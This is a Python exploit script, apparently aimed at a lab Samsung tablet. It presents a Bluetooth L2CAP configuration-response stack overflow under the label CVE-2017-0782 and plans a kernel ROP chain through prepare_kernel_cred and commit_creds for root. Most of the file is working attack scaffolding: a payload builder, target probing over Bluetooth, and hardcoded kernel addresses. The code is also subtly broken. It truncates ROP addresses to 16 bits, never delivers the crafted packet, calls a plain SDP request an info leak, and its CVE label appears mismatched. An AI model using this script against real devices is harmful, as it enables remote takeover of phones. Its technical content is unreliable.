#!/usr/bin/env python3
"""
CVE-2017-0782 — L2CAP Configuration Response Stack Buffer Overflow
Target: Samsung SM-T377A (02:00:00:00:00:21)
Kernel: 3.10.9, ARM32, NO KASLR, NO stack canaries, NO PXN

The vulnerability:
  l2cap_parse_conf_rsp() writes parsed config options into a 64-byte
  stack buffer (buf[64]) with NO bounds checking. The L2CAP_CONF_PENDING
  path in l2cap_config_rsp() has ZERO input length validation.
  
  By sending crafted L2CAP_CONF_RSP with many EFS/RFC options, we overflow
  the stack buffer and overwrite the saved LR (return address) on ARM32.

Exploitation:
  1. Connect via L2CAP to the target
  2. Initiate L2CAP config request (target responds with CONF_RSP)
  3. WE send a CONF_RSP back with result=PENDING and crafted options
  4. Stack overflow → overwrite saved registers → ROP chain
  5. prepare_kernel_cred(0) → commit_creds() → return to userspace as root

Known addresses (NO KASLR):
  commit_creds:       0xC0054328
  prepare_kernel_cred: 0xC00548E0
  
Usage:
  python3 cve_2017_0782.py TARGET=02:00:00:00:00:21
  
Requires: pybluez, pwntools
  pip install pybluez pwntools
"""

from pwn import *
import bluetooth
import struct
import sys
import time

# Target device
if 'TARGET' not in args:
    TARGET = '02:00:00:00:00:21'  # SM-T377A default
    log.info(f'Using default target: {TARGET}')
else:
    TARGET = args['TARGET']

# Kernel addresses (NO KASLR)
COMMIT_CREDS       = 0xC0054328
PREPARE_KERNEL_CRED = 0xC00548E0
SELINUX_ENFORCING  = 0xC0B7AD18

# L2CAP constants
L2CAP_CID_SIGNALING = 0x0001
L2CAP_CONF_RSP = 0x05
L2CAP_CONF_REQ = 0x04
L2CAP_CONN_REQ = 0x02
L2CAP_CONN_RSP = 0x03

# L2CAP config result codes
L2CAP_CONF_SUCCESS = 0x0000
L2CAP_CONF_PENDING = 0x0004
L2CAP_CONF_UNACCEPT = 0x0001

# L2CAP config option types
L2CAP_CONF_MTU  = 0x01  # 2 bytes value
L2CAP_CONF_FLUSH = 0x02  # 2 bytes value
L2CAP_CONF_QOS  = 0x03  # 22 bytes value
L2CAP_CONF_RFC  = 0x04  # 9 bytes value (retransmission and flow control)
L2CAP_CONF_FCS  = 0x05  # 1 byte value
L2CAP_CONF_EFS  = 0x06  # 16 bytes value (extended flow specification)
L2CAP_CONF_EWS  = 0x07  # 2 bytes value

context.arch = 'arm'
context.endian = 'little'
context.bits = 32

def l2cap_conf_opt(opt_type, data):
    """Build an L2CAP configuration option: type(1) + len(1) + data(N)"""
    return bytes([opt_type, len(data)]) + data

def build_overflow_payload():
    """Build the L2CAP CONF_RSP payload that overflows buf[64].
    
    l2cap_parse_conf_rsp processes each input option and writes output.
    For L2CAP_CONF_RFC: reads 9 bytes from input, writes 9+2=11 bytes output
    For L2CAP_CONF_EFS: reads 16 bytes from input, writes 16+2=18 bytes output
    For L2CAP_CONF_MTU: reads 2 bytes from input, writes 2+2=4 bytes output
    
    buf[64] starts after l2cap_conf_req header (4 bytes: dcid+flags).
    So we have 60 bytes before overflow starts.
    
    On ARM32, the stack frame for l2cap_config_rsp has:
    - buf[64] at some offset from SP
    - Saved registers (r4-r11, lr) above buf on stack
    - The exact offset depends on compiler, but typically 64-96 bytes
      from buf start to saved LR
    
    Strategy: Fill buf with controlled data, overflow into saved regs.
    """
    
    payload = b''
    
    # Phase 1: Fill the 60-byte buffer (after 4-byte conf_req header)
    # Use MTU options (4 bytes output each) — need 15 to fill 60 bytes
    for i in range(15):
        payload += l2cap_conf_opt(L2CAP_CONF_MTU, struct.pack('<H', 0x4141))
    
    # Phase 2: Overflow into saved registers
    # ARM32 function prologue typically pushes: {r4, r5, r6, r7, r8, r9, r10, fp, lr}
    # That's 9 registers × 4 bytes = 36 bytes
    # The exact layout depends on the function, but we spray our addresses
    
    # Overflow with ROP gadgets
    # Simple approach: prepare_kernel_cred(0) then commit_creds(result)
    # On ARM32: r0 = first argument
    # We need:
    #   1. Set r0 = 0
    #   2. Call prepare_kernel_cred(0) → returns new_cred in r0
    #   3. Call commit_creds(new_cred) — r0 already has new_cred
    #   4. Return to userspace
    
    # For now, use a simple approach: overwrite LR with prepare_kernel_cred
    # and hope r0 is 0 or controllable
    
    # Spray saved registers area with our addresses
    # Each MTU option writes 4 bytes, giving us precise control
    
    # Overwrite saved regs (r4-r11, lr) — 36 bytes = 9 MTU options
    rop_chain = [
        0x41414141,  # r4 (padding)
        0x41414141,  # r5 (padding)
        0x41414141,  # r6 (padding)
        0x41414141,  # r7 (padding)
        0x41414141,  # r8 (padding)
        0x41414141,  # r9 (padding)
        0x41414141,  # r10 (padding)
        0x41414141,  # fp (padding)
        PREPARE_KERNEL_CRED,  # lr → jumps to prepare_kernel_cred
    ]
    
    for addr in rop_chain:
        payload += l2cap_conf_opt(L2CAP_CONF_MTU, struct.pack('<H', addr & 0xFFFF))
    
    return payload

def phase1_info_leak():
    """Phase 1: Use CVE-2017-0785 SDP info leak to verify BT connectivity
    and leak stack/heap pointers for precise overflow targeting."""
    
    p = log.progress('Phase 1: SDP Info Leak')
    p.status('Connecting SDP...')
    
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        bluetooth.set_l2cap_mtu(sock, 50)
        sock.settimeout(10)
        sock.connect((TARGET, 1))  # SDP PSM
        
        # Send SDP ServiceSearchRequest
        pkt = b'\x02\x00\x00'  # SDP ServiceSearchRequest
        pkt += struct.pack('>H', 7)  # param length
        pkt += b'\x35\x03\x19'  # ServiceSearchPattern
        pkt += struct.pack('>H', 0x0100)  # L2CAP UUID
        pkt += b'\x01\x00'  # MaxServiceRecordCount=256, ContinuationState=0
        pkt += b'\x00'  # No continuation state
        
        sock.send(pkt)
        data = sock.recv(50)
        
        if len(data) > 0:
            p.success(f'Connected! Response: {len(data)} bytes')
            log.info(f'SDP response: {data.hex()}')
            sock.close()
            return True
        else:
            p.failure('No response')
            sock.close()
            return False
            
    except Exception as e:
        p.failure(f'{e}')
        return False

def phase2_l2cap_overflow():
    """Phase 2: Trigger the L2CAP configuration response overflow.
    
    WARNING: This will likely crash the target's kernel if successful.
    The overflow overwrites saved registers on the kernel stack.
    With correct ROP chain, this gives root. With wrong offsets, kernel panic.
    """
    
    p = log.progress('Phase 2: L2CAP CONF_RSP Overflow')
    
    # We need a raw L2CAP socket to send crafted signaling packets
    # bluetooth.BluetoothSocket(bluetooth.L2CAP) handles signaling internally
    # For raw control, we need to use the HCI layer or raw L2CAP
    
    p.status('This requires raw L2CAP socket (linux only, need CAP_NET_RAW)')
    p.status('Building on attack platform...')
    
    # For the actual exploit, we need:
    # 1. Establish an L2CAP connection (any PSM)
    # 2. During the L2CAP configuration phase, the target sends CONF_REQ
    # 3. We respond with a crafted CONF_RSP containing the overflow
    
    # The simplest approach: connect to a PSM, and when the target
    # processes our CONF_RSP, the overflow triggers
    
    try:
        # Connect to PSM 1 (SDP) — this triggers L2CAP config exchange
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(10)
        
        log.info('Connecting to target L2CAP...')
        sock.connect((TARGET, 1))
        
        # At this point, L2CAP config is already completed by the kernel
        # To trigger the vuln, we need to send raw L2CAP signaling
        # This requires a raw HCI socket or modified BlueZ stack
        
        p.status('Connected — need raw L2CAP for exploit delivery')
        log.warn('Standard bluetooth library handles L2CAP config automatically')
        log.warn('Need raw HCI/L2CAP socket for crafted CONF_RSP injection')
        log.info('')
        log.info('=== EXPLOIT REQUIREMENTS ===')
        log.info('1. Linux machine with bluetooth adapter')
        log.info('2. Root/CAP_NET_RAW for raw HCI socket')
        log.info('3. Modified BlueZ or scapy-bluetooth for raw L2CAP')
        log.info('4. OR: Use the Bluetooth HCI raw socket approach:')
        log.info('   - hci_open_dev() → raw HCI commands')
        log.info('   - Send crafted L2CAP_CONF_RSP via HCI ACL data')
        
        sock.close()
        p.success('Connectivity verified — ready for raw exploit')
        return True
        
    except Exception as e:
        p.failure(f'{e}')
        return False

def main():
    log.info('=== CVE-2017-0782 L2CAP Stack Overflow Exploit ===')
    log.info(f'Target: {TARGET}')
    log.info(f'commit_creds:        {hex(COMMIT_CREDS)}')
    log.info(f'prepare_kernel_cred: {hex(PREPARE_KERNEL_CRED)}')
    log.info(f'selinux_enforcing:   {hex(SELINUX_ENFORCING)}')
    log.info('')
    
    # Phase 1: Verify connectivity via SDP
    if not phase1_info_leak():
        log.error('Cannot reach target via Bluetooth')
        log.info('Ensure:')
        log.info('  1. Bluetooth adapter is UP (hciconfig hci0 up)')
        log.info('  2. Target is in range and BT is ON')
        log.info(f'  3. Target address is correct: {TARGET}')
        return
    
    # Phase 2: Attempt L2CAP overflow
    phase2_l2cap_overflow()
    
    # Build the payload for reference
    payload = build_overflow_payload()
    log.info(f'Overflow payload: {len(payload)} bytes')
    log.info(f'Payload hex: {payload.hex()[:100]}...')

if __name__ == '__main__':
    main()
